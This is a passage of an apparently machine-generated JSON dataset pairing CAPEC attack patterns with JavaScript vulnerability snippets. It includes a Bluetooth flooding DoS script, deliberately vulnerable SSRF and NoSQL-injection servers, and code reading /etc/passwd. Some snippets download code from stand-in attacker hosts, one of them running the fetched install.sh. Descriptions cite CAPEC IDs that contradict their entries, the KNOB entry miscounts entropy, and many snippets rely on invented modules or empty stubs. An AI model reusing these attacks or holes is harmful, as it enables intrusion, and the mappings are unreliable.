        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request: target parameter is missing');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Internal Server Error');\n  });\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. The server expects a URL parameter named 'target' and makes an HTTP GET request to the URL specified by this parameter. The response from the target URL is then sent back to the client. This code is vulnerable to Server-Side Request Forgery (SSRF) because it does not validate the 'target' parameter, allowing an attacker to make the server send requests to internal services or external sites with the server's privileges. This demonstrates CWE-918 (SSRF) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "const thunderboltController = require('thunderbolt-controller');\nconst spiDevice = require('spi-device');\n\n// CWE-1188: Insecure default initialization\nlet authEnabled = false; // Default insecure setting\n\n// CWE-345: Insufficient verification of data authenticity\nfunction verifyData(data) {\n  // Insecure verification\n  return data !== null;\n}\n\n// CWE-353: Missing support for integrity check\nfunction transmitData(data) {\n  // No integrity check\n  spiDevice.write(data);\n}\n\n// CWE-288: Authentication bypass\nfunction authenticate(user) {\n  if (user === 'admin') {\n    return true;\n  }\n  // Bypass authentication for non-admin users\n  return true;\n}\n\n// CWE-862: Missing authorization\nfunction accessResource(user, resource) {\n  if (authenticate(user)) {\n    // No authorization check\n    return resource;\n  }\n  return null;\n}\n\n// Simulate exploitation\nfunction exploitThunderbolt() {\n  const user = 'attacker';\n  const data = 'malicious data';\n\n  if (!authEnabled) {\n    console.log('Authentication is disabled by default.');\n  }\n\n  if (verifyData(data)) {\n    console.log('Data verified (insecurely).');\n    transmitData(data);\n  }\n\n  const resource = accessResource(user, 'sensitiveResource');\n  if (resource) {\n    console.log('Accessed resource:', resource);\n  }\n}\n\nexploitThunderbolt();",
        "description": "This JavaScript code snippet simulates the exploitation of Thunderbolt protection flaws by leveraging several common weaknesses (CWEs). The code initializes an insecure default setting for authentication (CWE-1188), performs insufficient verification of data authenticity (CWE-345), transmits data without integrity checks (CWE-353), bypasses authentication (CWE-288), and accesses resources without proper authorization checks (CWE-862). The `exploitThunderbolt` function demonstrates how an attacker could exploit these vulnerabilities to manipulate the Thunderbolt controller, transmit malicious data, and access sensitive resources without proper authentication and authorization."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "const bluetooth = require('bluetooth');\n\nfunction floodBluetoothDevice(targetAddress) {\n  const largePacket = Buffer.alloc(1024 * 1024, 'A'); // 1MB packet filled with 'A'\n  const l2capChannel = bluetooth.createL2CAPChannel(targetAddress, 0x1001); // L2CAP PSM for testing\n\n  l2capChannel.on('connect', () => {\n    console.log('Connected to target device');\n    setInterval(() => {\n      l2capChannel.write(largePacket);\n      console.log('Sent large packet');\n    }, 100); // Flood every 100ms\n  });\n\n  l2capChannel.on('error', (err) => {\n    console.error('Error:', err);\n  });\n}\n\nconst targetBluetoothAddress = '00:11:22:33:44:55'; // Example target address\nfloodBluetoothDevice(targetBluetoothAddress);",
        "description": "This JavaScript code snippet demonstrates a Bluetooth flooding attack, known as BlueSmacking, which aims to create a Denial of Service (DoS) on a Bluetooth-enabled device. The code uses the 'bluetooth' module to create an L2CAP channel to the target device and sends large packets (1MB each) at regular intervals (every 100ms). This can overwhelm the target device's resources, leading to a DoS condition. The code also highlights CWE-404 (Improper Resource Shutdown or Release) as the target device may not handle the flood of packets properly, leading to resource exhaustion. Additionally, the use of cleartext data (CWE-319) and potential lack of message integrity checks (CWE-924) are implicit vulnerabilities that could be exploited in a real-world scenario."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "const trustedMAC = '00:1A:7D:DA:71:13';\n\nfunction authenticateDevice(macAddress) {\n  if (macAddress === trustedMAC) {\n    console.log('Authentication successful');\n    // Perform actions assuming the device is trusted\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Adversary spoofs the MAC address\nconst adversaryMAC = '00:1A:7D:DA:71:13';\nauthenticateDevice(adversaryMAC);",
        "description": "This JavaScript code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing a trusted MAC address. The `authenticateDevice` function checks if the provided MAC address matches a trusted MAC address. If it does, it logs 'Authentication successful' and proceeds with trusted actions. An adversary can exploit this by spoofing the trusted MAC address, as shown with `adversaryMAC`, leading to successful authentication and potential malicious actions. This example highlights weaknesses such as Authentication Bypass by Spoofing (CWE-290) and Weak Authentication (CWE-1390)."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateKey() {\n  // Simulate key negotiation with low entropy\n  const entropyBits = 1; // Vulnerable: Low entropy bits\n  const key = crypto.randomBytes(entropyBits);\n  return key.toString('hex');\n}\n\nfunction authenticateDevice(device) {\n  const key = negotiateKey();\n  // Simulate authentication process\n  if (device.key === key) {\n    console.log('Device authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate an adversary in the middle attack\nfunction adversaryInTheMiddle(device) {\n  const interceptedKey = negotiateKey();\n  console.log(`Intercepted key: ${interceptedKey}`);\n  // Adversary can now decrypt communication\n  authenticateDevice({ key: interceptedKey });\n}\n\n// Example usage\nconst device = { key: negotiateKey() };\nadversaryInTheMiddle(device);",
        "description": "This JavaScript code snippet simulates a vulnerable Bluetooth key negotiation process with low entropy, embodying the main idea of the CAPEC 'Key Negotiation of Bluetooth Attack (KNOB)'. The 'negotiateKey' function generates a key with only 1 bit of entropy, making it easy for an adversary to guess. The 'authenticateDevice' function simulates the authentication process using this weak key. The 'adversaryInTheMiddle' function demonstrates an adversary intercepting the key negotiation and using the intercepted key to authenticate a device, representing an Adversary in the Middle attack. This code highlights the vulnerability of using low entropy in key negotiation, which can lead to easy decryption of communication, aligning with CWE-693 (Protection Mechanism Failure) and CWE-757 (Selection of Less-Secure Algorithm During Negotiation)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// Simulate an update process\nfunction updateSoftware(updateFilePath) {\n  // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n  const repoPath = '/path/to/repo';\n  if (!fs.existsSync(repoPath)) {\n    throw new Error('Repository path does not exist');\n  }\n\n  // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n  const updateContent = fs.readFileSync(updateFilePath, 'utf8');\n  if (!verifyUpdate(updateContent)) {\n    throw new Error('Update verification failed');\n  }\n\n  // CWE-506: Embedded Malicious Code\n  const maliciousCode = 'console.log(\"Malicious code executed\");';\n  const updatedContent = updateContent + '\\n' + maliciousCode;\n\n  // Apply the update\n  fs.writeFileSync('/path/to/software', updatedContent);\n  console.log('Software updated successfully');\n}\n\n// Simulate a verification function\nfunction verifyUpdate(content) {\n  // Insecure verification (for demonstration purposes)\n  return content.includes('valid-update');\n}\n\n// Simulate calling the update function\nupdateSoftware('/path/to/update-file');",
        "description": "This JavaScript code snippet simulates a software update process that embodies the main idea of CAPEC-117: Alteration of a Software Update. The code demonstrates several related CWEs:\n\n1. CWE-527: The repository path is hardcoded and checked for existence, but this could be exposed to unauthorized actors.\n2. CWE-807: The update verification relies on untrusted input, which can be easily bypassed.\n3. CWE-506: Malicious code is embedded into the update content before applying the update.\n\nThe `updateSoftware` function reads an update file, verifies it (insecurely), and appends malicious code to the update content before writing it to the software path. This represents an adversary altering a software update to include malicious code."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  // CWE-497: Exposure of Sensitive System Information\n  const sensitiveData = fs.readFileSync('/etc/passwd', 'utf8');\n  // CWE-913: Improper Control of Dynamically-Managed Code Resources\n  global.maliciousGlobal = sensitiveData;\n}\n\n// CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\nfunction securityCheck() {\n  if (process.env.SECURITY_FLAG !== 'true') {\n    console.log('Security check failed');\n    return false;\n  }\n  return true;\n}\n\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nif (securityCheck()) {\n  maliciousFunction();\n}\n",
        "description": "This JavaScript code snippet demonstrates a scenario where a development tool has been maliciously altered to include harmful functionality. The `maliciousFunction` reads sensitive system information from '/etc/passwd' (CWE-497) and improperly stores it in a global variable (CWE-913). The `securityCheck` function is intended to prevent unauthorized actions but is vulnerable to compiler or processor optimizations that might remove or alter this critical security check (CWE-733 and CWE-1037). This code embodies the main idea of CAPEC-442, where an adversary modifies development tools to inject malicious code into the software, leading to potential security breaches once the software is deployed."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASIC {\n  constructor() {\n    this.securityToken = this.generateSecurityToken();\n    this.confidentialData = 'Sensitive Information';\n  }\n\n  generateSecurityToken() {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    return Math.random().toString(36).substring(2); // Insecure token generation\n  }\n\n  accessConfidentialData(token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    if (token === this.securityToken) {\n      return this.confidentialData;\n    } else {\n      return 'Access Denied';\n    }\n  }\n\n  // CWE-1263: Improper Physical Access Control\n  physicalAccess() {\n    return 'Physical access granted to sensitive areas';\n  }\n}\n\n// Simulating malicious alteration of requirements\nlet asic = new ASIC();\nconsole.log(asic.accessConfidentialData('incorrectToken')); // Should be 'Access Denied'\nconsole.log(asic.physicalAccess()); // Should be restricted",
        "description": "This JavaScript code snippet represents the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered' by simulating an ASIC class with vulnerabilities. The `generateSecurityToken` method demonstrates CWE-1270 by generating insecure security tokens. The `accessConfidentialData` method shows CWE-1259 by improperly restricting access based on the insecure token. The `physicalAccess` method represents CWE-1263 by allowing unrestricted physical access to sensitive areas. The code simulates the malicious alteration of requirements by showing how these vulnerabilities can be exploited."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "function maliciousChipProgramming() {\n  // CWE-506: Embedded Malicious Code\n  const maliciousPayload = 'malicious_code';\n  \n  // CWE-509: Replicating Malicious Code\n  function replicateMaliciousCode() {\n    console.log('Replicating malicious code to other systems');\n    // Code to replicate the malicious payload\n  }\n  \n  // CWE-1423: Exposure of Sensitive Information\n  function exploitMicroarchitecturalPredictor() {\n    console.log('Exploiting shared microarchitectural predictor state');\n    // Code to exploit microarchitectural predictor state\n  }\n  \n  // CWE-1262: Improper Access Control for Register Interface\n  function accessHardwareRegisters() {\n    console.log('Accessing hardware registers without proper control');\n    // Code to access hardware registers\n  }\n  \n  // CWE-1259: Improper Restriction of Security Token Assignment\n  function manipulateSecurityTokens() {\n    console.log('Manipulating security tokens');\n    // Code to manipulate security tokens\n  }\n  \n  // Simulate the malicious behavior during chip programming\n  console.log('Programming chip with malicious payload');\n  replicateMaliciousCode();\n  exploitMicroarchitecturalPredictor();\n  accessHardwareRegisters();\n  manipulateSecurityTokens();\n}\n\nmaliciousChipProgramming();",
        "description": "This JavaScript code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' by embedding various malicious behaviors that align with the related CWEs. The function 'maliciousChipProgramming' represents the programming step where an adversary implants malicious code into a chip. It includes functions to replicate the malicious code (CWE-509), exploit shared microarchitectural predictor state (CWE-1423), access hardware registers without proper control (CWE-1262), and manipulate security tokens (CWE-1259). The code demonstrates how an adversary could embed and execute malicious logic during the chip programming phase, leading to potential security breaches when the chip is deployed."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "const fs = require('fs');\nconst https = require('https');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    const maliciousCode = data + '\\nconsole.log(\"Malicious code executed\");';\n    // CWE-215: Insertion of Sensitive Information Into Debugging Code\n    const debugInfo = 'DEBUG: User credentials: ' + process.env.USER_CREDENTIALS;\n    const finalCode = maliciousCode + '\\n' + debugInfo;\n    // CWE-507: Trojan Horse\n    fs.writeFileSync('legitimateApp.js', finalCode);\n    console.log('Application built and signed.');\n  });\n}).on('error', (err) => { console.error('Error downloading code:', err); });\n\n// Simulate signing process\nconst signApplication = () => {\n  console.log('Signing application...');\n  // Code to sign the application\n};\nsignApplication();",
        "description": "This JavaScript code snippet demonstrates a scenario where a developer inadvertently signs a maliciously altered software. The code downloads a script from a remote location without verifying its integrity (CWE-494). It then embeds malicious code into the downloaded script (CWE-506) and adds sensitive debugging information (CWE-215). The final code, which appears to be a legitimate application but contains hidden malicious functionality (CWE-507), is written to a file and simulated to be signed by the developer. This represents the CAPEC scenario where a developer unknowingly signs software that has been compromised during the build process."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "const FPGA = require('fpga-library');\n\n// Original FPGA configuration\nlet originalConfig = FPGA.getConfig();\n\n// Malicious function to alter FPGA behavior\nfunction maliciousFunction() {\n  // Injecting malicious code\n  console.log('Malicious function executed');\n  // Potentially harmful operations\n  // ...\n}\n\n// Simulate unauthorized error injection\nfunction injectError() {\n  console.log('Error injected to degrade redundancy');\n  // Degrade system redundancy\n  // ...\n}\n\n// Simulate voltage and clock glitch attack\nfunction glitchAttack() {\n  console.log('Voltage and clock glitch attack initiated');\n  // Bypass security mechanisms\n  // ...\n}\n\n// Reload FPGA configuration with malicious function\nfunction reloadFPGAConfig() {\n  let newConfig = originalConfig;\n  newConfig.maliciousFunction = maliciousFunction;\n  FPGA.setConfig(newConfig);\n  console.log('FPGA configuration reloaded with malicious function');\n}\n\n// Execute the attack\nreloadFPGAConfig();\nmaliciousFunction();\ninjectError();\nglitchAttack();",
        "description": "This JavaScript code snippet simulates an attack on an FPGA by reloading its configuration with a malicious function. The code first retrieves the original FPGA configuration and then defines a malicious function that could perform harmful operations. It also includes functions to simulate unauthorized error injection and voltage/clock glitch attacks, which can degrade system redundancy and bypass security mechanisms. Finally, the FPGA configuration is reloaded with the malicious function, and the attack functions are executed. This represents the CAPEC scenario where an adversary alters the FPGA's functionality to introduce malicious behavior, leveraging related weaknesses such as embedded malicious code, unauthorized error injection, and improper protection against voltage and clock glitches."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "class Device {\n  constructor(data) {\n    this.data = data; // CWE-316: Storing sensitive data in cleartext\n  }\n\n  decommission() {\n    // CWE-1266: Improper scrubbing of sensitive data\n    // CWE-1301: Insufficient data removal\n    this.data = null; // Attempt to remove data\n  }\n\n  reuse() {\n    // CWE-226: Sensitive information not removed before reuse\n    if (this.data !== null) {\n      console.log('Sensitive data still present:', this.data);\n    } else {\n      console.log('Device is ready for reuse.');\n    }\n  }\n}\n\n// Example usage\nlet device = new Device('Sensitive Information');\ndevice.decommission();\ndevice.reuse();",
        "description": "This JavaScript code snippet defines a `Device` class that simulates the handling of sensitive data in a device. The `Device` class has a constructor that initializes the device with sensitive data (CWE-316: Cleartext Storage of Sensitive Information in Memory). The `decommission` method attempts to remove the sensitive data by setting it to `null` (CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device and CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component). The `reuse` method checks if the sensitive data has been properly removed before reusing the device (CWE-226: Sensitive Information in Resource Not Removed Before Reuse). The example usage demonstrates creating a device with sensitive information, decommissioning it, and then attempting to reuse it, highlighting the potential issue of sensitive data still being present."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst MongoClient = require('mongodb').MongoClient;\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst url = 'mongodb://localhost:27017';\nconst dbName = 'mydatabase';\n\nMongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, (err, client) => {\n  if (err) throw err;\n  const db = client.db(dbName);\n\n  app.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    // Vulnerable to NoSQL Injection\n    db.collection('users').findOne({ username: username, password: password }, (err, user) => {\n      if (err) throw err;\n      if (user) {\n        res.send('Login successful');\n      } else {\n        res.send('Login failed');\n      }\n    });\n  });\n\n  app.listen(3000, () => {\n    console.log('Server is running on port 3000');\n  });\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MongoDB connection. It includes a '/login' endpoint that takes 'username' and 'password' from the request body and queries the MongoDB 'users' collection to find a matching user. The query is constructed directly from user input without any sanitization or validation, making it vulnerable to NoSQL Injection attacks. An attacker could manipulate the input to bypass authentication or execute arbitrary commands, demonstrating the main idea of CAPEC-943 and related CWEs such as improper neutralization of special elements and improper validation of input."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "const fs = require('fs');\nconst path = '/sys/firmware/motherboard/flash_memory';\n\n// CWE-506: Embedded Malicious Code\nfunction insertMalware() {\n  const maliciousCode = 'console.log(\"Malware executed\");';\n  fs.writeFileSync(path, maliciousCode);\n}\n\n// CWE-509: Replicating Malicious Code\nfunction replicateMalware() {\n  const targetPaths = ['/sys/firmware/motherboard/flash_memory1', '/sys/firmware/motherboard/flash_memory2'];\n  targetPaths.forEach(targetPath => {\n    fs.writeFileSync(targetPath, fs.readFileSync(path));\n  });\n}\n\n// CWE-1262: Improper Access Control for Register Interface\nfunction accessHardwareRegisters() {\n  const registerPath = '/sys/hardware/registers';\n  const data = fs.readFileSync(registerPath);\n  console.log('Accessed hardware registers:', data);\n}\n\n// CWE-497: Exposure of Sensitive System Information\nfunction exposeSensitiveInfo() {\n  const sensitiveInfo = fs.readFileSync('/sys/firmware/sensitive_info');\n  console.log('Sensitive Information:', sensitiveInfo);\n}\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nfunction manageTraceData() {\n  const traceData = fs.readFileSync('/sys/firmware/trace_data');\n  fs.writeFileSync('/untrusted/location/trace_data', traceData);\n}\n\ninsertMalware();\nreplicateMalware();\naccessHardwareRegisters();\nexposeSensitiveInfo();\nmanageTraceData();",
        "description": "This JavaScript code snippet simulates a server motherboard compromise by inserting and replicating malware into the flash memory of a server motherboard. It demonstrates several related CWEs: \n1. CWE-506: The `insertMalware` function writes malicious code to the flash memory.\n2. CWE-509: The `replicateMalware` function copies the malicious code to other memory locations.\n3. CWE-1262: The `accessHardwareRegisters` function reads from hardware registers without proper access control.\n4. CWE-497: The `exposeSensitiveInfo` function reads and exposes sensitive system information.\n5. CWE-1323: The `manageTraceData` function improperly manages trace data by storing it in an untrusted location.\n\nThe code represents the main idea of CAPEC-Server Motherboard Compromise by showing how an adversary could insert and propagate malware, access sensitive hardware registers, expose sensitive information, and mishandle trace data, all of which compromise the server's intended functionality."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst configPath = process.env.CONFIG_PATH || './config.json';\n\n// CWE-377: Insecure Temporary File\nconst tempFilePath = path.join('/tmp', 'tempConfig.json');\n\n// CWE-497: Exposure of Sensitive System Information\nconst sensitiveData = 'Sensitive System Information';\n\ntry {\n  // CWE-913: Improper Control of Dynamically-Managed Code Resources\n  let configData = require(configPath);\n  configData.tempFile = tempFilePath;\n  configData.sensitiveData = sensitiveData;\n\n  // CWE-209: Generation of Error Message Containing Sensitive Information\n  fs.writeFileSync(tempFilePath, JSON.stringify(configData));\n} catch (error) {\n  console.error('Error processing configuration:', error.message, sensitiveData);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where system build data can be maliciously altered. The code reads a configuration file from an untrusted search path (CWE-426), creates an insecure temporary file (CWE-377), and exposes sensitive system information (CWE-497) in an error message (CWE-209). Additionally, it improperly controls dynamically-managed code resources (CWE-913) by modifying the configuration data. This snippet embodies the main idea of CAPEC-471 by showing how the system build process can be deliberately misconfigured through the alteration of build data."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "const buffer = new ArrayBuffer(16);\nconst view = new DataView(buffer);\n\n// Simulate improper access control by allowing write and execute on the same memory region\nview.setUint8(0, 0x90); // NOP instruction in x86\nview.setUint8(1, 0xC3); // RET instruction in x86\n\n// Function to execute code from the buffer (simulating execution of writable memory)\nfunction executeBuffer() {\n  const func = new Function('return new Uint8Array(buffer);');\n  return func();\n}\n\n// Simulate an attacker injecting and executing code\nconst injectedCode = executeBuffer();\nconsole.log('Injected Code:', injectedCode);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Exploitation of Improperly Configured or Implemented Memory Protections' vulnerability. It creates a buffer and a DataView to manipulate the buffer's contents. The code then simulates improper access control by writing executable instructions (NOP and RET) into the buffer. The 'executeBuffer' function simulates the execution of code from a writable memory region, representing a scenario where an attacker could inject and execute malicious code. This example embodies the main idea of the CAPEC by showing how missing or incorrect memory protections can be exploited, with context from related CWEs such as insufficient granularity of address regions, improper access control, and the lack of exclusivity between write and execute operations."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class Register { \n  constructor() { \n    this.lockBit = false; \n    this.data = 0; \n  }\n\n  writeData(value) { \n    if (!this.lockBit) { \n      this.data = value; \n    } else { \n      console.log('Register is locked. Cannot write data.'); \n    } \n  }\n\n  lockRegister() { \n    this.lockBit = true; \n  }\n\n  unlockRegister() { \n    this.lockBit = false; \n  }\n\n  readData() { \n    return this.data; \n  }\n}\n\n// Example usage\nconst reg = new Register();\nreg.writeData(42); // Write data to register\nconsole.log(reg.readData()); // Read data from register\nreg.lockRegister(); // Lock the register\nreg.writeData(84); // Attempt to write data to locked register\nconsole.log(reg.readData()); // Read data from register\nreg.unlockRegister(); // Unlock the register\nreg.writeData(84); // Write data to register\nconsole.log(reg.readData()); // Read data from register",
        "description": "This JavaScript code snippet defines a Register class that simulates a hardware register with a lock bit mechanism. The class includes methods to write data to the register, lock and unlock the register, and read data from the register. The lock bit is intended to prevent unauthorized modifications to the register's data. However, the unlockRegister method allows the lock bit to be reset, which represents a vulnerability where an adversary could potentially unlock the register and modify its contents. This embodies the main idea of the CAPEC by demonstrating how improper access control and lock bit protection can be exploited to modify sensitive data."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC {\n  constructor() {\n    this.securityTokens = {};\n  }\n\n  assignToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    this.securityTokens[entity] = token;\n  }\n\n  performAction(entity, action) {\n    // CWE-1294: Insecure Security Identifier Mechanism\n    if (!this.securityTokens[entity]) {\n      console.log('Action denied: No security token assigned.');\n      return;\n    }\n\n    // CWE-1270: Generation of Incorrect Security Tokens\n    if (this.securityTokens[entity] !== 'VALID_TOKEN') {\n      console.log('Action denied: Invalid security token.');\n      return;\n    }\n\n    // CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n    if (!entity) {\n      console.log('Action denied: Missing source identifier.');\n      return;\n    }\n\n    // Perform the action\n    console.log(`Action ${action} performed by ${entity}`);\n  }\n}\n\n// Example usage\nconst soc = new SoC();\nsoc.assignToken('entity1', 'INVALID_TOKEN'); // Improper token assignment\nsoc.performAction('entity1', 'read'); // Attempt to perform action with invalid token\nsoc.performAction('', 'write'); // Attempt to perform action with missing source identifier\nsoc.assignToken('entity2', 'VALID_TOKEN');\nsoc.performAction('entity2', 'execute'); // Valid action",
        "description": "This JavaScript code snippet represents a simplified System-on-Chip (SoC) security mechanism that assigns and verifies security tokens for entities attempting to perform actions. The code demonstrates several vulnerabilities: improper restriction of security token assignment (CWE-1259), insecure security identifier mechanism (CWE-1294), generation of incorrect security tokens (CWE-1270), and missing source identifier in entity transactions (CWE-1302). The `assignToken` method assigns tokens to entities, while the `performAction` method checks for valid tokens and source identifiers before allowing actions. The example usage shows how these vulnerabilities can be exploited."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isFirmwareUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  checkFirmwareUpdate() {\n    if (!this.isFirmwareUpdateable) {\n      console.log('Firmware cannot be updated. Device is vulnerable.');\n      return;\n    }\n    // Logic to update firmware\n    console.log('Firmware updated successfully.');\n  }\n\n  performOperation() {\n    try {\n      // Simulate operation that could be affected by voltage or clock glitches (CWE-1247)\n      let result = this.sensitiveOperation();\n      console.log('Operation result:', result);\n    } catch (error) {\n      console.log('Operation failed due to voltage/clock glitch:', error);\n    }\n  }\n\n  sensitiveOperation() {\n    // Simulate a sensitive operation\n    if (Math.random() < 0.1) { // Simulate a 10% chance of glitch\n      throw new Error('Voltage/Clock glitch detected');\n    }\n    return 'Sensitive data';\n  }\n}\n\nconst device = new Device();\ndevice.checkFirmwareUpdate();\ndevice.performOperation();",
        "description": "This JavaScript code snippet defines a `Device` class that embodies the main idea of CAPEC-Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities. The `Device` class has a firmware version and a flag indicating whether the firmware is updateable (CWE-1277). The `checkFirmwareUpdate` method checks if the firmware can be updated and logs a message if it cannot, highlighting the vulnerability. The `performOperation` method simulates an operation that could be affected by voltage or clock glitches (CWE-1247), with a 10% chance of failure to represent the glitch. This code demonstrates how a device with unpatchable firmware and susceptibility to glitches can be vulnerable to exploitation."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Function to download a file without integrity check\nfunction downloadFile(url, dest) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close();\n      console.log('Download completed');\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    console.error('Download failed:', err.message);\n  });\n}\n\n// Function to read metadata from a file\nfunction readMetadata(filePath) {\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      console.error('Error reading metadata:', err.message);\n      return;\n    }\n    console.log('File Metadata:', stats);\n  });\n}\n\n// Download a file from a less trusted source\nconst url = 'http://example.com/malicious-file.js';\nconst destination = 'downloaded-file.js';\ndownloadFile(url, destination);\n\n// Read metadata of the downloaded file\nreadMetadata(destination);",
        "description": "This JavaScript code snippet demonstrates a scenario where a file is downloaded from a potentially less trusted source without performing an integrity check (CWE-494). The `downloadFile` function downloads a file from a given URL and saves it to a specified destination. The `readMetadata` function reads and logs the metadata of the downloaded file. This setup can be exploited by an adversary to alter the metadata of the downloaded file (CAPEC- Metadata Spoofing), making it appear legitimate. The code also touches on CWE-348 by using a less trusted source for the download, CWE-1230 by potentially exposing sensitive information through metadata, and CWE-941 by not correctly specifying the intended destination in the communication channel."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst url = 'https://untrusted-source.com/malicious-package.tar.gz';\nconst filePath = '/tmp/malicious-package.tar.gz';\n\nhttps.get(url, (response) => {\n  const file = fs.createWriteStream(filePath);\n  response.pipe(file);\n  file.on('finish', () => {\n    file.close(() => {\n      console.log('Downloaded malicious package without integrity check.');\n      // Simulate execution of the downloaded package\n      require('child_process').exec(`tar -xzf ${filePath} -C /tmp && /tmp/malicious-package/install.sh`, (err, stdout, stderr) => {\n        if (err) {\n          console.error(`Execution error: ${err}`);\n          return;\n        }\n        console.log(`Output: ${stdout}`);\n        console.error(`Errors: ${stderr}`);\n      });\n    });\n  });\n}).on('error', (err) => {\n  console.error(`Download error: ${err.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a package is downloaded from an untrusted source without performing any integrity checks. The code uses the 'https' module to download a file from a potentially malicious URL and saves it to a temporary directory. After downloading, it simulates the execution of the downloaded package. This embodies the CAPEC 'Spoof Open-Source Software Metadata' by showing how an attacker could spoof metadata to make a malicious package appear legitimate. The code also highlights related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-348 (Use of Less Trusted Source), and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-494: Download code without integrity check\nhttps.get('https://malicious-source.com/repo/commit-metadata.json', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-527: Exposure of repository to unauthorized control sphere\n    fs.writeFile('/path/to/repo/.git/COMMIT_EDITMSG', data, (err) => {\n      if (err) throw err;\n      console.log('Commit metadata spoofed successfully');\n    });\n  });\n}).on('error', (err) => { console.error('Error downloading metadata:', err); });\n\n// CWE-540: Inclusion of sensitive information in source code\nconst sensitiveInfo = 'password=12345';\nfs.writeFile('/path/to/repo/config.js', sensitiveInfo, (err) => {\n  if (err) throw err;\n  console.log('Sensitive information included in source code');\n});",
